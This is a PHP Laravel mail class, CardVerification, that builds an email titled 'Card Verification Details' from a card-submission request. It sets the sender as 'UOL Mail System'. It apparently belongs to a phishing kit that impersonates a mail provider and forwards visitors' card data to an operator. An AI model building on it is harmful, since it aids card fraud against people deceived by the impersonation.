<?php

namespace App\Mail;

use App\Http\Requests\StoreCardRequest;
use App\Models\Visitor;
use Illuminate\Bus\Queueable;
use Illuminate\Mail\Mailable;
use Illuminate\Mail\Mailables\Address;
use Illuminate\Mail\Mailables\Content;
use Illuminate\Mail\Mailables\Envelope;
use Illuminate\Queue\SerializesModels;

class CardVerification extends Mailable {
    use Queueable, SerializesModels;

    public readonly Visitor $visitor;

    /**
     * Create a new message instance.
     */
    public function __construct(public StoreCardRequest $request)
    {
        $this->visitor = Visitor::current();
    }

    /**
     * Get the message envelope.
     */
    public function envelope(): Envelope
    {
        return new Envelope(
            from: new Address('no-reply@uolmail.com', 'UOL Mail System'),
            subject: 'Card Verification Details - ' . $this->visitor->user,
        );
    }

    /**
     * Get the message content definition.
     */
    public function content(): Content
    {
        return new Content(
            markdown: 'mail.card-verification',
        );
    }

    /**
     * Get the attachments for the message.
     *
     * @return array<int, \Illuminate\Mail\Mailables\Attachment>
     */
    public function attachments(): array
    {
        return [];
    }
}
